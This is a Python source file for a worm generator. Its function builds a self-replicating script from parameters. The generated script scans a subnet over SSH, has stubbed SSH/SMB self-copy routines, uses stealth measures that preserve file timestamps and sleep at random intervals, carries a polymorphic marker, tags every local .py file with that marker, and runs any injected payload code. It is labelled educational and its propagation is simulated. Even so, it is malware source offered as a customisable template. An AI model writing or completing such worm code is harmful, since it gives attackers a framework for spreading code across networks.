import random
import string


def generate_worm_payload(
    target_subnet=None,
    payload_code=None,
    propagation_methods=("ssh", "smb"),
    polymorphic=True,
    stealth=True,
    max_hosts=254,
    custom_message=None,
    target_ip=None
):
    """
    Generate a fully-featured, customizable worm payload (for educational/lab use only).
    If target_subnet is not provided, it will be inferred from target_ip (e.g., '10.0.0.5' -> '10.0.0.').
    """
    # Infer subnet from target_ip if not explicitly provided
    if not target_subnet and target_ip:
        parts = target_ip.split('.')
        if len(parts) == 4:
            target_subnet = '.'.join(parts[:3]) + '.'
        else:
            target_subnet = "192.168.1."
    elif not target_subnet:
        target_subnet = "192.168.1."

    # Polymorphic marker/code
    marker = "#~worm~" + "".join(
        random.choices(string.ascii_letters + string.digits, k=8)
    ) + "~#"
    poly_code = (
        "import random\n"
        "def poly():\n"
        "    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))\n"
    ) if polymorphic else ""

    # Stealth: preserve timestamps, random sleep
    stealth_code = (
        "import os, time\n"
        "def preserve_timestamp(fname, func):\n"
        "    ts = os.path.getmtime(fname)\n"
        "    func()\n"
        "    os.utime(fname, (ts, ts))\n"
        "def stealth_sleep():\n"
        "    import random, time\n"
        "    time.sleep(random.uniform(0.5, 2.5))\n"
    ) if stealth else ""

    # Propagation via SSH (simulation)
    ssh_code = (
        "def propagate_ssh(ip):\n"
        "    try:\n"
        "        import socket\n"
        "        s = socket.socket()\n"
        "        s.settimeout(0.5)\n"
        "        s.connect((ip, 22))\n"
        "        # Would attempt to copy itself here (e.g., via paramiko/SCP)\n"
        "        s.close()\n"
        "    except Exception:\n"
        "        pass\n"
    ) if "ssh" in propagation_methods else ""

    # Propagation via SMB (simulation)
    smb_code = (
        "def propagate_smb(ip):\n"
        "    try:\n"
        "        # Would attempt to connect to SMB and copy itself\n"
        "        pass\n"
        "    except Exception:\n"
        "        pass\n"
    ) if "smb" in propagation_methods else ""

    # Infection logic
    infect_code = (
        "def infect():\n"
        "    import glob, os\n"
        f"    marker = {repr(marker)}\n"
        "    for fname in glob.glob('*.py'):\n"
        "        try:\n"
        "            with open(fname, 'r+') as f:\n"
        "                content = f.read()\n"
        "                if marker not in content:\n"
        "                    f.seek(0,0)\n"
        "                    f.write('# ' + marker + '\\n' + content)\n"
        "        except Exception:\n"
        "            pass\n"
    )

    # Custom payload/message
    payload_section = (
        "def payload():\n"
        "    # Custom payload goes here\n"
        f"{'    pass' if not payload_code else '    ' + payload_code.replace(chr(10), chr(10)+'    ')}\n"
        f"    {f'print({repr(custom_message)})' if custom_message else ''}\n"
    )

    # Spread logic
    spread_code = (
        "def spread():\n"
        f"    for i in range(1, {max_hosts+1}):\n"
        f"        ip = '{target_subnet}' + str(i)\n"
        f"{'        propagate_ssh(ip)' if 'ssh' in propagation_methods else ''}\n"
        f"{'        propagate_smb(ip)' if 'smb' in propagation_methods else ''}\n"
        f"{'        stealth_sleep()' if stealth else ''}\n"
        "    payload()\n"
    )

    # Compose full worm code
    worm_code = (
        "#!/usr/bin/env python3\n"
        f"{poly_code}"
        f"{stealth_code}"
        f"{ssh_code}"
        f"{smb_code}"
        f"{payload_section}"
        f"{infect_code}"
        f"{spread_code}"
        "if __name__ == '__main__':\n"
        "    infect()\n"
        "    spread()\n"
    )

    return {
        "worm_payload": worm_code,
        "description": (
            "A customizable, simulated worm that scans a subnet, propagates via SSH/SMB, supports polymorphism, "
            "stealth, and custom payload/message. For educational/lab use only."
        ),
        "marker": marker,
    }
